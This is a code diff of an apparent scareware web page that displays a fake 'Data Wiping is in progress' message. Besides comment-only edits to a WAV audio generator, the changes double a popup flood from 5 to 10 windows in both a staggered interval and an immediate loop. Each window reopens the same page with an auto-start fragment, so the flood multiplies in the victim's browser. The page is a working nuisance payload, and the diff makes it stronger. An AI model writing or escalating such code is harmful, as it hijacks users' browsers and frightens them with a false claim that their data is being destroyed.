@@ -193,9 +193,9 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             const byteRate = sampleRate * numChannels * (bitsPerSample / 8);
             const blockAlign = numChannels * (bitsPerSample / 8);
             const dataSize = pcm16.length * 2;
-            const totalBufferSize = 44 + dataSize; // FIX: Correct total size for ArrayBuffer
+            const totalBufferSize = 44 + dataSize; // Correct total size for ArrayBuffer
             
-            const buffer = new ArrayBuffer(totalBufferSize); // FIX APPLIED
+            const buffer = new ArrayBuffer(totalBufferSize); 
             const view = new DataView(buffer);
             let offset = 0;
 
@@ -207,13 +207,13 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             
             // RIFF Chunk (0 - 11)
             writeString('RIFF'); 
-            view.setUint32(offset, totalBufferSize - 8, true); offset += 4; // ChunkSize (Total size - 8)
+            view.setUint32(offset, totalBufferSize - 8, true); offset += 4; 
             writeString('WAVE'); 
 
             // FMT Chunk (12 - 35)
             writeString('fmt '); 
-            view.setUint32(offset, 16, true); offset += 4; // Subchunk1Size
-            view.setUint16(offset, 1, true); offset += 2;  // Audio format
+            view.setUint32(offset, 16, true); offset += 4; 
+            view.setUint16(offset, 1, true); offset += 2;  
             view.setUint16(offset, numChannels, true); offset += 2;
             view.setUint32(offset, sampleRate, true); offset += 4;
             view.setUint32(offset, byteRate, true); offset += 4;
@@ -222,7 +222,7 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             
             // DATA Chunk (36 - 43)
             writeString('data'); 
-            view.setUint32(offset, dataSize, true); offset += 4; // Subchunk2Size
+            view.setUint32(offset, dataSize, true); offset += 4; 
             
             // Write PCM data (44 onwards)
             for (let i = 0; i < pcm16.length; i++) {
@@ -404,9 +404,9 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
         const currentUrl = window.location.href.split('#')[0]; 
         const autoStartUrl = currentUrl + "#start";
         
-        // 1. ASYNCHRONOUS DELAYED FLOOD (5 windows)
+        // 1. ASYNCHRONOUS DELAYED FLOOD (10 windows)
         function startSecondaryFlood() {
-            const NUM_STAGGERED_WINDOWS = 5; 
+            const NUM_STAGGERED_WINDOWS = 10; 
             let count = 0;
             
             const floodInterval = setInterval(() => {
@@ -420,9 +420,9 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             }, 50); 
         }
 
-        // 2. HYPER-SYNCHRONOUS IMMEDIATE BLAST (5 windows)
+        // 2. HYPER-SYNCHRONOUS IMMEDIATE BLAST (10 windows)
         function startSynchronousBlast() {
-            const NUM_WINDOWS = 5; 
+            const NUM_WINDOWS = 10; 
             for (let i = 0; i < NUM_WINDOWS; i++) {
                 // Use a different window name for each one to ensure they are new windows
                 window.open(autoStartUrl, 'blastWindow' + i, getRandomWindowFeatures(800, 600));
